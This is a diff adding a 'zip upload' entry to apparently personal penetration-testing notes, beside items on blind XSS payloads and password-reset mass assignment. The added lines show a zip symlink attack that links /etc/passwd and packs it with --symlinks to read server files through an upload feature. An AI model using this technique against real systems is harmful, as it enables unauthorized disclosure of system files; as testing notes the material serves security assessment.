@@ -56,6 +56,12 @@
 - manual tests
     - submit blind xss payloads
     - XSStrike
+## zip upload
+- zip symlink exploit
+```bash
+ln -s /etc/passwd link
+zip --symlinks evil.zip link
+```
 
 ## reset senha
 - mass assignment email/telefone in all password change
